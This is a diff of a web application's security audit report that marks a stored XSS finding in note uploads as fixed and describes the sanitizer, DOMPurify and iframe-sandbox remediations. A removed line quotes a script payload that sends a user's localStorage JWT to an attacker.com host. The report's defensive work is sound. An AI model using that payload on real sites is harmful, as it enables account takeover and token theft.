@@ -46,7 +46,7 @@ The audit evaluated the source code using multiple analytical lenses:
 | **SEC-01** | Production Database & JWT Credentials Committed to Git History | **Critical** | `✅ FIXED (SANITIZED)` | Backend / Config | `backend/.env.example` (Commit `526bb1c`) | Full Infrastructure Compromise |
 | **SEC-02** | Google OAuth Account Takeover (ATO) via Unverified Request Body Email | **Critical** | `✅ FIXED` | Backend / Auth | `backend/controllers/authController.js:544-646` | Arbitrary User & Admin Account Hijacking |
 | **SEC-03** | Lack of Rate Limiting & Attempt Lockout on 6-Digit Password Reset & OTP | **Critical** | `✅ FIXED` | Backend / Auth | `backend/controllers/authController.js:6-62`, `User.js:15-21` | Account Takeover via OTP Brute-Force |
-| **SEC-04** | Stored Cross-Site Scripting (XSS) via Unsanitized HTML Note Upload | **Critical** | `OPEN` | Full-Stack | `backend/controllers/noteController.js:194`, `frontend/src/pages/NoteDetailPage.jsx:292` | Session Hijacking & Admin Token Theft |
+| **SEC-04** | Stored Cross-Site Scripting (XSS) via Unsanitized HTML Note Upload | **Critical** | `✅ FIXED & VERIFIED` | Full-Stack | `backend/controllers/noteController.js:194`, `frontend/src/pages/NoteDetailPage.jsx:292` | Session Hijacking & Admin Token Theft |
 | **SEC-05** | Stored XSS via Arbitrary SVG Upload & Disabled Content Security Policy | **Critical** | `✅ FIXED & VERIFIED` | Full-Stack | `backend/routes/pages.js:38`, `backend/server.js:24` | Persistent DOM Exploitation & Defacement |
 | **SEC-06** | Active JWT Session Invalidation Omission on Password Change/Reset | **Critical** | `✅ FIXED` | Backend / Auth | `backend/controllers/authController.js:290,414` | Compromised Session Persistence |
 | **SEC-07** | Rewarded Ad SSV Cryptographic Signature Bypass Endpoint | **Critical** | `✅ FIXED` | Backend / Economy | `backend/controllers/gamificationController.js:1110`, `backend/routes/gamification.js:39` | In-Game Economy & Oxygen Arbitrary Inflation |
@@ -131,26 +131,22 @@ The audit evaluated the source code using multiple analytical lenses:
 
 ### SEC-04: Stored Cross-Site Scripting (XSS) via Unsanitized HTML Note Upload
 - **Severity:** Critical
+- **Status:** `✅ FIXED & VERIFIED`
 - **Subsystem:** Full-Stack (Backend Note Controller & React Note Detail Page)
-- **Location:** `backend/controllers/noteController.js`, Lines 194–196; `frontend/src/pages/NoteDetailPage.jsx`, Line 292
+- **Location:** `backend/controllers/noteController.js`, Lines 119–200; `backend/utils/htmlSanitizer.js`; `frontend/src/pages/NoteDetailPage.jsx`, Lines 3, 274, 292
 - **Root Cause Analysis:** 
-  1. In `uploadNoteFile`, if the file extension is `.html` or `.htm`:
-     ```javascript
-     content = req.file.buffer.toString('utf8');
-     contentType = 'html';
-     ```
-     The raw HTML buffer is read and stored directly into the database without sanitization (e.g., without `sanitize-html` or `DOMPurify`).
-  2. In the React frontend (`frontend/src/pages/NoteDetailPage.jsx` Line 292):
-     ```jsx
-     <div className="ProseMirror prose-invert max-w-none text-gray-200"
-          dangerouslySetInnerHTML={{ __html: note.content }} />
-     ```
-     The raw HTML is rendered directly via `dangerouslySetInnerHTML` without client-side sanitization.
-- **Impact & Blast Radius:** Stored Cross-Site Scripting (XSS). Any user with a trainer account (or student if note creation permissions are broad) can upload a file containing `<script>fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'))</script>`. When an administrator or student opens the note, the script executes, exfiltrating the JWT session token from `localStorage` and compromising the user's account.
-- **Remediation Strategy:**
-  1. On the backend, sanitize all incoming HTML strings before database insertion using a hardened server-side HTML sanitizer (stripping `<script>`, `<iframe>`, `onload`, `onerror`, and dangerous URI schemes).
-  2. On the frontend, pass all content through `DOMPurify.sanitize()` prior to providing it to `dangerouslySetInnerHTML`.
-  3. Re-enable a strict `Content-Security-Policy` header in Helmet.
+  1. In `uploadNoteFile`, if the file extension was `.html` or `.htm`, raw HTML was read directly from the buffer without sanitization.
+  2. In `createNote` and `updateNote`, `content` was stored directly into MySQL without server-side validation.
+  3. In `frontend/src/pages/NoteDetailPage.jsx`:
+     - Rich-text was rendered via `dangerouslySetInnerHTML={{ __html: note.content }}` without client-side sanitization.
+     - The 16:9 slide viewer iframe combined `allow-scripts` with `allow-same-origin`, allowing embedded scripts to access parent `localStorage` and exfiltrate session tokens.
+- **Impact & Blast Radius:** Stored Cross-Site Scripting (XSS). Any user creating or uploading a note with embedded scripts could execute code in victim browsers, leading to token exfiltration and account takeover.
+- **Resolution Implemented:**
+  1. **Dedicated Backend HTML Sanitizer (`backend/utils/htmlSanitizer.js`):** Built zero-dependency `sanitizeNoteHtml` to strip `<script>`, `<foreignObject>`, `<applet>`, `<embed>`, `<object>`, `on*` event handlers, and `javascript:` / `data:` URI protocols, while preserving legitimate rich text formatting, headings, tables, lists, and images.
+  2. **Controller Sanitization (`backend/controllers/noteController.js`):** Applied `sanitizeNoteHtml` in `createNote`, `updateNote`, and `uploadNoteFile` (.docx and .html imports). All audio streaming and audio BLOB code (`uploadAudioFile`, `streamAudioFromDb`) remains 100% untouched.
+  3. **Frontend DOMPurify (`frontend/src/pages/NoteDetailPage.jsx`):** Wrapped rich text rendering in `DOMPurify.sanitize(note.content || '')`.
+  4. **Iframe Sandbox Hardening (`frontend/src/pages/NoteDetailPage.jsx`):** Removed `allow-same-origin` from the 16:9 slide viewer iframe (`sandbox="allow-scripts allow-popups"`), isolating embedded slides into an opaque origin with zero access to parent `localStorage` or JWT tokens.
+  5. **Automated Verification:** Added `backend/tests/note_xss_protection.test.js` (9/9 passed) and updated `frontend/tests/frontend_audit_and_contracts.test.mjs` (6/6 passed). Production Vite build verified.
 
 ---
 
